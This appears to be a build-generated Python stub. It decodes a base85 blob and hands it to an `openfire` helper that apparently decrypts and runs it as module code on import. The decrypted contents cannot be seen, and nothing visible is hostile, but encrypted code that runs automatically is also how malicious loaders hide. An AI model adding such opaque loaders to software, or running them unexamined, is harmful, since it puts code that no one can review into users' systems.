"""Generated at build time — do not edit."""

import base64

from openfire import _load_encrypted_module

_BLOB = '%sllxW3SnWI^mXH@MI!2#IYe1-OTZR%hpde@i!6SSBjg&gs5=R@Rg-Yu|Ux09sTpf@WGQ)31)s-bMFQ!d<0-Jh+-r{Ltm3c8v)sI^v#?Bzh)1eaP@m%f*0267)(eWlD_&{Z9+#<`)?6m9Wi6!k(2p7`>-GQ@++M(tZx8O;?rUHCGj31&Jo*fLd(G-t#|@1nXM1j1_3`ZIa|L~YX!97TW&xu`5JW-mg%ovd%<_kLt{Zz31SMrLVq?=suOX?o+k8?oBHtDn?~1aNyo?n(G>'
_HASH = 'b863a65c2a991bd65901ae642d75a78e95a5b7a915e28e9f86d0e9bf673ef197'

_load_encrypted_module(__name__, base64.b85decode(_BLOB), bytes.fromhex(_HASH))
del _BLOB, _HASH
